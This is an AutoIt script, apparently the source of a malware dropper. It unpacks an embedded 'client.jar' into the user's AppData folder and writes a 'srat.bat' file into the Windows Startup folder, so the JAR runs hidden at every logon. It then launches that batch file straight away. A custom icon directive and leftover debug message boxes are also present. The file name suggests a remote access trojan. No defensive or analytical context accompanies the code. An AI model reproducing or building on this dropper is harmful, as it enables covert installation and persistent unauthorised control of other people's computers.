#AutoIt3Wrapper_icon=img.ico

#include "resources.au3"

$jar_file = @AppDataDir & "\client.jar"

If Not FileExists($jar_file) Then
   MsgBox(0, "", $jar_file)
   MsgBox(0, "", _ResourceGetAsStringW("JAR"))
   _ResourceSaveToFile($jar_file, "JAR", $RT_RCDATA, 0, 1)
   MsgBox(0, "", @error)
EndIf

$bat_file = @AppDataDir & "\Microsoft\Windows\Start Menu\Programs\Startup\srat.bat"
$bat_body = "@echo off" & @CRLF & "start /B " & $jar_file

$file = FileOpen($bat_file, 10)
FileWrite($file, $bat_body)
FileClose($file)

ShellExecute($bat_file)